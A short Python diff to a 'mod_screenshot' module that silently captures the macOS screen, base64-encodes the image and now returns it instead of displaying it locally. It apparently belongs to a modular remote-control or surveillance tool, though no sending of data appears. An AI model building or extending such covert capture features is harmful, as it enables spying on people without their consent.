@@ -12,8 +12,7 @@ class mod_screenshot(mod_interfaceRunCmd):
         pass
 
     def run_mod(self):
-        self.take_screenshot()
-        pass
+        return self.take_screenshot()
 
     def take_screenshot(self):
         self.run_command("screencapture -x " + OUTPUT_FILE)
@@ -21,8 +20,6 @@ class mod_screenshot(mod_interfaceRunCmd):
         image_read = image.read()
         image_64_encode = base64.encodebytes(image_read)
         print(f'Screenshot taken successfully!')
-
-        with Image.open(OUTPUT_FILE) as img:
-            img.show()
-
+        # with Image.open(OUTPUT_FILE) as img:
+        #     img.show()
         return image_64_encode
